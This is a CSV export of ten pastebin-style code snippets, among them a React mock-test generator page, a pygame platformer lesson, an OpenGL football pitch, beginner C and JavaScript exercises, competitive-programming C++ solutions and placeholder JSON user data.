id,title,username,language,date,content
ftRuhwMp,GenerateTest.tsx,windrunner,JavaScript,Monday 7th of April 2025 11:29:49 AM CDT,"import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';
import { Header } from './Header';
import { Footer } from './Footer';
import { Button } from ""@/components/ui/button"";
import { Loader2, TestTube, BadgeCheck, BookOpen, Download } from ""lucide-react"";
import { cn } from ""@/lib/utils"";
import { useTheme } from ""@/hooks/useTheme"";
import { useScrollAnimation } from ""@/hooks/useScrollAnimation"";
import '../styles/GenerateTest.css';
import '../styles/MockTest.css';
import { BlockMath, InlineMath } from ""react-katex"";
import ""katex/dist/katex.min.css"";

// Subject background images and colors
const subjectThemes: Record<string, { bgImage: string, primaryColor: string, icon: React.ElementType }> = {
  biology: { 
    bgImage: ""https://images.unsplash.com/photo-1530026405186-ed1f139313f8"", 
    primaryColor: ""rgba(16, 185, 129, 0.8)"", // green
    icon: TestTube
  },
  chemistry: {
    bgImage: ""https://images.unsplash.com/photo-1603126857599-f6e157fa2fe6"",
    primaryColor: ""rgba(124, 58, 237, 0.8)"", // purple
    icon: TestTube
  },
  physics: {
    bgImage: ""https://images.unsplash.com/photo-1636466497217-26a8cbeaf0aa"",
    primaryColor: ""rgba(59, 130, 246, 0.8)"", // blue
    icon: TestTube
  },
  mathematics: {
    bgImage: ""https://images.unsplash.com/photo-1635372722656-389f87a941db"",
    primaryColor: ""rgba(239, 68, 68, 0.8)"", // red
    icon: TestTube
  },
  default: {
    bgImage: ""https://images.unsplash.com/photo-1488190211105-8b0e65b80b4e"",
    primaryColor: ""rgba(79, 70, 229, 0.8)"", // indigo
    icon: TestTube
  }
};

const GenerateTest = () => {
  const { subject = """" } = useParams();
  const [loading, setLoading] = useState(false);
  const [testResult, setTestResult] = useState('');
  const { isDarkMode } = useTheme();
  
  // Animation refs
  const fadeInRef = useScrollAnimation({ animation: 'fade' });
  const slideUpRef = useScrollAnimation({ animation: 'slide', direction: 'up', delay: 3 });
  
  // Format subject for display (capitalize first letter)
  const formattedSubject = subject
    .replace(/_/g, "" "")
    .split("" "")
    .map(word => word.charAt(0).toUpperCase() + word.slice(1))
    .join("" "");
  
  const subjectKey = subject.toLowerCase().replace(/_/g, """");
  const { bgImage, primaryColor, icon: SubjectIcon } = subjectThemes[subjectKey] || subjectThemes.default;

  const generateTest = async () => {
    setLoading(true);
    setTestResult('');
    
    try {
      const res = await axios.post(""http://127.0.0.1:8001/api/generate"", {
        subject: subject.toLowerCase(),
      });
      setTestResult(res.data.mock_test);
    } catch (error: any) {
      console.error(""Error generating test:"", error.response?.data || error);
      alert(""An error occurred while generating the test."");
    } finally {
      setLoading(false);
    }
  };

  const handlePrint = () => {
    window.print();
  };

  const formatResponse = (text: string): JSX.Element[] | null => {
    if (!text) return null;

    const formattedElements: JSX.Element[] = [];
    let currentOptions: JSX.Element[] = [];
    let questionCount = 0;
    let insideSection = false;

    text.split(""\n"").forEach((line, index) => {
      if (line.startsWith(""###"")) {
        questionCount = 0;
        insideSection = true;
        formattedElements.push(
          <h3 key={index} className=""formatted-subheading"">
            {line.replace(""###"", """").trim()}
          </h3>
        );
      } else if (line.match(/^\d+\./)) {
        if (insideSection) {
          questionCount++;
          const questionText = line.replace(/^\d+\.\s*/, """").trim();
          const containsMath = questionText.includes(""$"") || questionText.includes(""\\("");

          formattedElements.push(
            <div key={index} className=""mcq-container"">
              <p className=""mcq-question"">
                {`${questionCount}. `}
                {containsMath ? <BlockMath>{questionText}</BlockMath> : questionText}
              </p>
            </div>
          );
        } else {
          formattedElements.push(
            <p key={index} className=""formatted-text"">
              {line}
            </p>
          );
        }
      } else if (line.match(/^[a-d]\)/i)) {
        const optionText = line.replace(/^[a-d]\)\s*/, """").trim();
        const containsMath = optionText.includes(""$"") || optionText.includes(""\\("");

        currentOptions.push(
          <span key={index} className=""mcq-option"">
            {containsMath ? <InlineMath>{optionText}</InlineMath> : optionText}
          </span>
        );
      } else {
        const containsMath = line.includes(""$"") || line.includes(""\\("");

        formattedElements.push(
          <p key={index} className=""formatted-text"">
            {containsMath ? <InlineMath>{line}</InlineMath> : line}
          </p>
        );
      }
    });

    if (currentOptions.length > 0) {
      formattedElements.push(
        <div key=""final-options"" className=""mcq-options"">{currentOptions}</div>
      );
    }

    return formattedElements;
  };

  return (
    <div className={cn(
      ""min-h-screen"",
      isDarkMode 
        ? ""bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900"" 
        : ""bg-gradient-to-b from-blue-50 via-indigo-50/30 to-white""
    )}>
      <Header />
      
      {/* Particles background */}
      <div id=""particles-js"" className=""fixed inset-0 pointer-events-none""></div>
      
      <div className=""pt-28 pb-20 px-4 container max-w-4xl mx-auto relative"">
        {/* Hero section with background image */}
        <div className=""text-center mb-10"" ref={fadeInRef}>
          <div className=""inline-block p-2 rounded-full bg-primary/10 mb-4 animate-bounce"">
            <SubjectIcon className=""h-6 w-6 text-primary"" />
          </div>
          
          <h1 className={cn(
            ""text-3xl md:text-5xl font-bold mb-4"",
            ""animate-fade-in""
          )}>
            Generate {formattedSubject} Mock Test
          </h1>
          
          <p className=""text-muted-foreground text-lg max-w-2xl mx-auto mb-8 animate-fade-in stagger-1"">
            Create customized mock tests with detailed solutions to test your knowledge and prepare for exams.
          </p>
          
          <div className=""flex items-center justify-center gap-4 mb-12 animate-fade-in stagger-2"">
            <Button 
              size=""lg""
              onClick={generateTest}
              className=""gap-2 px-8 py-6 h-auto rounded-full font-semibold text-lg shadow-lg hover:shadow-xl hover:scale-105 transition-all""
              style={{ 
                background: primaryColor,
                borderColor: 'transparent'
              }}
              disabled={loading}
            >
              {loading ? (
                <>
                  <Loader2 className=""h-5 w-5 animate-spin"" />
                  Generating Test...
                </>
              ) : (
                <>
                  <TestTube className=""h-5 w-5"" />
                  Create {formattedSubject} Test
                </>
              )}
            </Button>
          </div>
          
          <div className=""grid grid-cols-1 md:grid-cols-3 gap-6 max-w-3xl mx-auto animate-fade-in stagger-3"">
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <BookOpen className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Curriculum-Aligned</h3>
              <p className=""text-muted-foreground text-sm"">Tests based on the official syllabus and exam patterns</p>
            </div>
            
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <BadgeCheck className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Detailed Solutions</h3>
              <p className=""text-muted-foreground text-sm"">Step-by-step explanations for every question</p>
            </div>
            
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <Download className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Downloadable PDF</h3>
              <p className=""text-muted-foreground text-sm"">Save tests for offline practice and reference</p>
            </div>
          </div>
        </div>

        {/* Test Result */}
        {loading && (
          <div className=""flex flex-col items-center justify-center p-10 text-center"">
            <div className=""w-16 h-16 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4""></div>
            <p className=""text-lg font-medium"">Generating your test...</p>
            <p className=""text-muted-foreground"">This may take a few moments</p>
          </div>
        )}
        
        {testResult && (
          <div 
            className={cn(
              ""rounded-2xl p-6 md:p-8 animate-fade-in"",
              isDarkMode ? ""bg-gray-800/70"" : ""bg-white/90 shadow-lg"",
              ""border border-primary/10""
            )}
            ref={slideUpRef}
          >
            <div className=""mb-6 flex justify-between items-center"">
              <h2 className=""text-2xl font-bold"">{formattedSubject} Mock Test</h2>
              <Button variant=""outline"" className=""rounded-full gap-2"" onClick={handlePrint}>
                <Download className=""h-4 w-4"" />
                Download PDF
              </Button>
            </div>
            
            <div className=""test-result"">
              <div className=""formatted-output"">{formatResponse(testResult)}</div>
            </div>
            
            <div className=""mt-8 flex flex-col sm:flex-row gap-4 justify-center"">
              <Button 
                onClick={generateTest}
                className=""gap-2""
                variant=""outline""
              >
                <TestTube className=""h-4 w-4"" />
                Generate Another Test
              </Button>
              
              <Button className=""gap-2"">
                View Solutions
              </Button>
            </div>
          </div>
        )}
      </div>
      
      <Footer />
    </div>
  );
};

export default GenerateTest;"
p7256gGR,Lesson 6 - Coins,MCreeper12731,Python,Monday 7th of April 2025 11:19:47 AM CDT,"import pygame
pygame.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.on_ground = False
        self.score = 0
        self.direction = 0
    
    def move(self):
        keys = pygame.key.get_pressed()
        if keys[pygame.K_d]:
            self.speed_x = 5
            self.direction = 1
        elif keys[pygame.K_a]:
            self.speed_x = -5
            self.direction = -1
        else:
            self.speed_x = 0

        if keys[pygame.K_SPACE] and self.on_ground == True:
            self.on_ground = False
            self.speed_y = -18

        if self.speed_y < 20:
            self.speed_y += 1

        self.position.x += self.speed_x
        self.position.y += self.speed_y

        if self.position.x < 0:
            self.position.x = 0
        if self.position.x > width - self.size:
            self.position.x = width - self.size
        if self.position.y < 0:
            self.position.y = 0
        if self.position.y > height - self.size:
            self.position.y = height - self.size
        
        for platform in platforms:
            if self.position.colliderect(platform):
                resolve_collision(self.position, platform)

        

player = Player(100, 100)
player2 = Player(300, 300)

platforms = [pygame.Rect(0, height - 50, width, 50), pygame.Rect(300, 500, 200, 20), pygame.Rect(600, 350, 200, 20), pygame.Rect(900, 400, 200, 20)]

# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            player.speed_y = 0
            rect_a.y += dy1  # Move down
        else:
            player.on_ground = True
            player.speed_y = 0
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili

    player.move()


    # ---
    # Izris likov
    # ---

    if (player.direction < 0):
        window.blit(pygame.transform.flip(player.image, True, False), player.position)
    else:
        window.blit(player.image, player.position)
    for platform in platforms:
        pygame.draw.rect(window, (0, 127, 0), platform)


    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
eZ0hHxyK,Farm,YanislavD,JavaScript,Monday 7th of April 2025 11:18:02 AM CDT,"function solve (input) {

    const countFarmers = input.shift();
    let farmers = [];

    for (let i = 0; i < countFarmers; i++) {
        let currentFarmer = input.shift().split(' ');
        const farmerName = currentFarmer.shift();
        const workArea = currentFarmer.shift();
        let tasks = currentFarmer.shift().split(',');

        let farmer = {
            name: farmerName,
            workArea: workArea,
            tasks: tasks
        };

        farmers.push(farmer);
    }

    let tokens = input.shift().split(' / ');

    while(tokens[0] !== ""End"") {

        switch (tokens[0]) {

            case 'Execute': {
                const farmerName = tokens[1];
                const workArea = tokens[2];
                const task = tokens[3];

                let farmer = farmers.find(f => f.name === farmerName);

                if (farmer.workArea === workArea && farmer.tasks.includes(task)) {
                    console.log(`${farmerName} has executed the task: ${task}!`);
                } else {
                    console.log(`${farmerName} cannot execute the task: ${task}.`);
                }
                break;
            }

            case `Change Area`: {
                const farmerName = tokens[1];
                const newWorkArea = tokens[2];

                farmers.find(f => f.name === farmerName).workArea = newWorkArea;

                console.log(`${farmerName} has changed their work area to: ${newWorkArea}`)
                break;
            }

            case `Learn Task`: {
                const farmerName = tokens[1];
                const newTask = tokens[2];

                if (farmers.find(f => f.name === farmerName).tasks.includes(newTask)) {
                    console.log(`${farmerName} already knows how to perform ${newTask}.`);
                } else {
                    farmers.find(f => f.name === farmerName).tasks.push(newTask);
                    console.log(`${farmerName} has learned a new task: ${newTask}.`);
                }
                break;
            }
        }


        tokens = input.shift().split(' / ');
    }

    for (let farmer of farmers) {
       farmer.tasks.sort((a, b) => a.localeCompare(b));
       console.log(`Farmer: ${farmer.name}, Area: ${farmer.workArea}, Tasks: ${farmer.tasks.join(', ')}`);
    }

}

solve([ 
    ""2"", 
    ""John garden watering,weeding"", 
    ""Mary barn feeding,cleaning"", 
    ""Execute / John / garden / watering"", 
    ""Execute / Mary / garden / feeding"", 
    ""Learn Task / John / planting"", 
    ""Execute / John / garden / planting"", 
    ""Change Area / Mary / garden"", 
    ""Execute / Mary / garden / cleaning"", 
    ""End"" 
  ] )
"
2DXWEe8g,Projeto CG,Diogo03,C++,Monday 7th of April 2025 11:14:41 AM CDT,"#include <GL/glut.h>
#include <bits/stdc++.h>

const double PI = M_PI;

bool touch(float x1, float y1, float x2, float y2, float r1, float r2) {
    double d = sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));
    return (d <= r1 + r2);
}

void drawCircle(double cx, double cy, double r, int segments) {
    glBegin(GL_LINE_LOOP);
    for (int i = 0; i < segments; i++) {
        double theta = 2.0 * PI * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawFilledCircle(double cx, double cy, double r, int segments) {
    glBegin(GL_POLYGON);
    for (int i = 0; i < segments; i++) {
        double theta = 2.0 * PI * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawLeftPenaltyArc(double cx, double cy, double r, int segments) {
    double startAngle = -0.87;
    double endAngle   =  0.87;
    glBegin(GL_LINE_STRIP);
    for (int i = 0; i <= segments; i++) {
        double theta = startAngle + (endAngle - startAngle) * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawRightPenaltyArc(double cx, double cy, double r, int segments) {
    double startAngle = 3.14 - 0.87;
    double endAngle   = 3.14 + 0.87;
    glBegin(GL_LINE_STRIP);
    for (int i = 0; i <= segments; i++) {
        double theta = startAngle + (endAngle - startAngle) * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawGoalInsideArea(double x, double y) {
    double goalWidth = 2.5;
    double goalHeight = 10.5;
    
    glBegin(GL_LINE_LOOP);
        glVertex2f(x, y);
        glVertex2f(x + goalWidth, y);
        glVertex2f(x + goalWidth, y + goalHeight);
        glVertex2f(x, y + goalHeight);
    glEnd();
}

void display() {
    glClear(GL_COLOR_BUFFER_BIT);
    glColor3f(1, 1, 1);

    glBegin(GL_LINE_LOOP);
        glVertex2f(0, 0);
        glVertex2f(105, 0);
        glVertex2f(105, 68);
        glVertex2f(0, 68);
    glEnd();

    glBegin(GL_LINES);
        glVertex2f(52.5, 0);
        glVertex2f(52.5, 68);
    glEnd();

    drawCircle(52.5, 34, 9.15, 100);

    glBegin(GL_LINE_LOOP);
        glVertex2f(0, 13.85);
        glVertex2f(16.5, 13.85);
        glVertex2f(16.5, 54.15);
        glVertex2f(0, 54.15);
    glEnd();

    glBegin(GL_LINE_LOOP);
        glVertex2f(105, 13.85);
        glVertex2f(88.5, 13.85);
        glVertex2f(88.5, 54.15);
        glVertex2f(105, 54.15);
    glEnd();

    drawLeftPenaltyArc(10.65, 34, 9.15, 100);
    drawRightPenaltyArc(94.35, 34, 9.15, 100);

    glPointSize(5.0);
    glBegin(GL_POINTS);
        glVertex2f(11, 34);
    glEnd();
    glBegin(GL_POINTS);
        glVertex2f(94, 34);
    glEnd();
    glBegin(GL_POINTS);
        glVertex2f(52.5, 34);
    glEnd();

    double leftGoalY = 34 - (10.5 / 2);
    double rightGoalY = 34 - (10.5 / 2);
    drawGoalInsideArea(0, leftGoalY);
    drawGoalInsideArea(105 - 2.5, rightGoalY);

    glutSwapBuffers();
}


void init() {
    glClearColor(0.0f, 0.5f, 0.0f, 1.0f); 
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluOrtho2D(0.0, 105.0, 0.0, 68.0);
}

int main(int argc, char** argv) {
    glutInit(&argc, argv);
    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB);
    glutInitWindowSize(1050, 680);
    glutCreateWindow(""Campo de Futebol 2D"");
    init();
    glutDisplayFunc(display);
    glutMainLoop();
    return 0;
}
"
Q5NcJaWV,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:59:03 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;


int main() {
    ll k, x;
    cin >> k >> x;
    
    ll res = 1e18;
    if(x % k == 0) {
        res = x / k;
    }
    
    ll power = 1;
    for(int i = 0; i <= 100; i++) {
        ll tmp = power * k;
        if(tmp > x) {
            break;
        }
        if(x % tmp == 0) {
            ll n = x / tmp;
            if(n * tmp == x) {
                res = min(res, n + i);
            }
        }
        power *= k;
    }
    if(res == 1e18) {
        res = -1;
    }
    cout << res << endl;
        
    return 0;
}
"
YDHffFXx,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:42:32 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;


int main() {
    int a, b;
    cin >> a >> b;
    
    if(a < b) {
        swap(a, b);
    }
    
    int res = 2e9;
    for(int i = 0; i <= a; i++) {
        if(((a - i) % 3 != 0) and ((b + i) % 3 != 0)) {
            res = min(res, abs((b + i) - (a - i)));
        }
    }
    cout << res << endl;
    
    
    return 0;
}
"
Xh0RmyND,Untitled,devzeus,JSON,Monday 7th of April 2025 10:37:34 AM CDT,"{""maxamount"": 0.02,""cooldown"": 660, ""grest"": 10, ""max_sol"": 0.0004, ""max_pepe"": 500}"
KD3LYtMD,userData,zXenoc,JSON,Monday 7th of April 2025 10:34:46 AM CDT,"[
  {
    ""id"": 1,
    ""name"": ""Leanne Graham"",
    ""username"": ""Bret"",
    ""email"": ""Sincere@april.biz"",
	""permission: worker""
    ""address"": {
      ""street"": ""Kulas Light"",
      ""suite"": ""Apt. 556"",
      ""city"": ""Gwenborough"",
      ""zipcode"": ""92998-3874"",
      ""geo"": {
        ""lat"": ""-37.3159"",
        ""lng"": ""81.1496""
      }
    },
    ""phone"": ""1-770-736-8031 x56442"",
    ""website"": ""hildegard.org"",
    ""company"": {
      ""name"": ""Romaguera-Crona"",
      ""catchPhrase"": ""Multi-layered client-server neural-net"",
      ""bs"": ""harness real-time e-markets""
    }
  },
  {
    ""id"": 2,
    ""name"": ""Ervin Howell"",
    ""username"": ""Antonette"",
    ""email"": ""Shanna@melissa.tv"",
	""permission: admin""
    ""address"": {
      ""street"": ""Victor Plains"",
      ""suite"": ""Suite 879"",
      ""city"": ""Wisokyburgh"",
      ""zipcode"": ""90566-7771"",
      ""geo"": {
        ""lat"": ""-43.9509"",
        ""lng"": ""-34.4618""
      }
    },
    ""phone"": ""010-692-6593 x09125"",
    ""website"": ""anastasia.net"",
    ""company"": {
      ""name"": ""Deckow-Crist"",
      ""catchPhrase"": ""Proactive didactic contingency"",
      ""bs"": ""synergize scalable supply-chains""
    }
  },
  {
    ""id"": 3,
    ""name"": ""Clementine Bauch"",
    ""username"": ""Samantha"",
    ""email"": ""Nathan@yesenia.net"",
	""permission: manager""
    ""address"": {
      ""street"": ""Douglas Extension"",
      ""suite"": ""Suite 847"",
      ""city"": ""McKenziehaven"",
      ""zipcode"": ""59590-4157"",
      ""geo"": {
        ""lat"": ""-68.6102"",
        ""lng"": ""-47.0653""
      }
    },
    ""phone"": ""1-463-123-4447"",
    ""website"": ""ramiro.info"",
    ""company"": {
      ""name"": ""Romaguera-Jacobson"",
      ""catchPhrase"": ""Face to face bifurcated interface"",
      ""bs"": ""e-enable strategic applications""
    }
  },
  {
    ""id"": 4,
    ""name"": ""Patricia Lebsack"",
    ""username"": ""Karianne"",
    ""email"": ""Julianne.OConner@kory.org"",
    ""address"": {
      ""street"": ""Hoeger Mall"",
      ""suite"": ""Apt. 692"",
      ""city"": ""South Elvis"",
      ""zipcode"": ""53919-4257"",
      ""geo"": {
        ""lat"": ""29.4572"",
        ""lng"": ""-164.2990""
      }
    },
    ""phone"": ""493-170-9623 x156"",
    ""website"": ""kale.biz"",
    ""company"": {
      ""name"": ""Robel-Corkery"",
      ""catchPhrase"": ""Multi-tiered zero tolerance productivity"",
      ""bs"": ""transition cutting-edge web services""
    }
  },
  {
    ""id"": 5,
    ""name"": ""Chelsey Dietrich"",
    ""username"": ""Kamren"",
    ""email"": ""Lucio_Hettinger@annie.ca"",
    ""address"": {
      ""street"": ""Skiles Walks"",
      ""suite"": ""Suite 351"",
      ""city"": ""Roscoeview"",
      ""zipcode"": ""33263"",
      ""geo"": {
        ""lat"": ""-31.8129"",
        ""lng"": ""62.5342""
      }
    },
    ""phone"": ""(254)954-1289"",
    ""website"": ""demarco.info"",
    ""company"": {
      ""name"": ""Keebler LLC"",
      ""catchPhrase"": ""User-centric fault-tolerant solution"",
      ""bs"": ""revolutionize end-to-end systems""
    }
  },
  {
    ""id"": 6,
    ""name"": ""Mrs. Dennis Schulist"",
    ""username"": ""Leopoldo_Corkery"",
    ""email"": ""Karley_Dach@jasper.info"",
    ""address"": {
      ""street"": ""Norberto Crossing"",
      ""suite"": ""Apt. 950"",
      ""city"": ""South Christy"",
      ""zipcode"": ""23505-1337"",
      ""geo"": {
        ""lat"": ""-71.4197"",
        ""lng"": ""71.7478""
      }
    },
    ""phone"": ""1-477-935-8478 x6430"",
    ""website"": ""ola.org"",
    ""company"": {
      ""name"": ""Considine-Lockman"",
      ""catchPhrase"": ""Synchronised bottom-line interface"",
      ""bs"": ""e-enable innovative applications""
    }
  },
  {
    ""id"": 7,
    ""name"": ""Kurtis Weissnat"",
    ""username"": ""Elwyn.Skiles"",
    ""email"": ""Telly.Hoeger@billy.biz"",
    ""address"": {
      ""street"": ""Rex Trail"",
      ""suite"": ""Suite 280"",
      ""city"": ""Howemouth"",
      ""zipcode"": ""58804-1099"",
      ""geo"": {
        ""lat"": ""24.8918"",
        ""lng"": ""21.8984""
      }
    },
    ""phone"": ""210.067.6132"",
    ""website"": ""elvis.io"",
    ""company"": {
      ""name"": ""Johns Group"",
      ""catchPhrase"": ""Configurable multimedia task-force"",
      ""bs"": ""generate enterprise e-tailers""
    }
  },
  {
    ""id"": 8,
    ""name"": ""Nicholas Runolfsdottir V"",
    ""username"": ""Maxime_Nienow"",
    ""email"": ""Sherwood@rosamond.me"",
    ""address"": {
      ""street"": ""Ellsworth Summit"",
      ""suite"": ""Suite 729"",
      ""city"": ""Aliyaview"",
      ""zipcode"": ""45169"",
      ""geo"": {
        ""lat"": ""-14.3990"",
        ""lng"": ""-120.7677""
      }
    },
    ""phone"": ""586.493.6943 x140"",
    ""website"": ""jacynthe.com"",
    ""company"": {
      ""name"": ""Abernathy Group"",
      ""catchPhrase"": ""Implemented secondary concept"",
      ""bs"": ""e-enable extensible e-tailers""
    }
  },
  {
    ""id"": 9,
    ""name"": ""Glenna Reichert"",
    ""username"": ""Delphine"",
    ""email"": ""Chaim_McDermott@dana.io"",
    ""address"": {
      ""street"": ""Dayna Park"",
      ""suite"": ""Suite 449"",
      ""city"": ""Bartholomebury"",
      ""zipcode"": ""76495-3109"",
      ""geo"": {
        ""lat"": ""24.6463"",
        ""lng"": ""-168.8889""
      }
    },
    ""phone"": ""(775)976-6794 x41206"",
    ""website"": ""conrad.com"",
    ""company"": {
      ""name"": ""Yost and Sons"",
      ""catchPhrase"": ""Switchable contextually-based project"",
      ""bs"": ""aggregate real-time technologies""
    }
  },
  {
    ""id"": 10,
    ""name"": ""Clementina DuBuque"",
    ""username"": ""Moriah.Stanton"",
    ""email"": ""Rey.Padberg@karina.biz"",
    ""address"": {
      ""street"": ""Kattie Turnpike"",
      ""suite"": ""Suite 198"",
      ""city"": ""Lebsackbury"",
      ""zipcode"": ""31428-2261"",
      ""geo"": {
        ""lat"": ""-38.2386"",
        ""lng"": ""57.2232""
      }
    },
    ""phone"": ""024-648-3804"",
    ""website"": ""ambrose.net"",
    ""company"": {
      ""name"": ""Hoeger LLC"",
      ""catchPhrase"": ""Centralized empowering task-force"",
      ""bs"": ""target end-to-end models""
    }
  }
]"
n319zsgZ,7-4-25 vectores,Aluneth,C,Monday 7th of April 2025 10:33:32 AM CDT,"#include <stdio.h>
#include <stdlib.h>

/* Elaborar una función que reciba tres enteros y nos retorne el valor promedio de los mismos */

float calcularPromedio(int num1, int num2, int num3, float uno) {
    float p;
    p=(num1+num2+num3/uno)/3;

    return p;
}


int main()
{
    int num1, num2, num3;
    float uno, promedio;
    uno = 1;

    printf(""Ingrese el valor 1: "");
    scanf(""%d"", &num1);
    printf(""Ingrese el valor 2: "");
    scanf(""%d"", &num2);
    printf(""Ingrese el valor 3: "");
    scanf(""%d"", &num3);

    promedio=calcularPromedio(num1,num2,num3,uno);

    printf(""\nEl promedio es: %.2f"", promedio);

    return 0;
}


#include <stdio.h>
#include <stdlib.h>

/* Confeccionar un programa que defina dos funciones, una que permita cargar un vector de 5 elementos enteros y otra que muestre un vector de 5 elementos enteros.
En la función main definir una variable de tipo vector y seguidamente llamar a las dos funciones. */

void cargarVector(int v[5])
{
    for (int i = 0; i<5; i++)
    {
        printf(""Introduzca el valor %d: "", i+1);
        scanf(""%d"", &v[i]);
    }
}

void mostrarVector(int v[5]) {
    for (int i = 0; i<5; i++)
    {
        printf(""%d - "", v[i]);
    }
}

int main()
{
    int vector[5];
    cargarVector(vector);
    mostrarVector(vector);
    return 0;
}

"
E2uNC9Q6,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:29:51 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;

ll dist(ll x, ll y, ll x2, ll y2) {
    return llabs(x - x2) + llabs(y - y2);
}
int main() {
    ll W, H, C, R;
    cin >> W >> H >> C >> R;
    
    ll x = W / C;
    ll res1 = dist(x * C, x * R, W, H);
    
    x++;
    ll res2 = dist(x * C, x * R, W, H);
    
    x = H / R;
    ll res3 = dist(x * C, x * R, W, H);
    
    x++;
    ll res4 = dist(x * C, x * R, W, H);
    
    cout << min(min(res1, res2), min(res3, res4)) << endl;
    
    
    
    return 0;
}
"
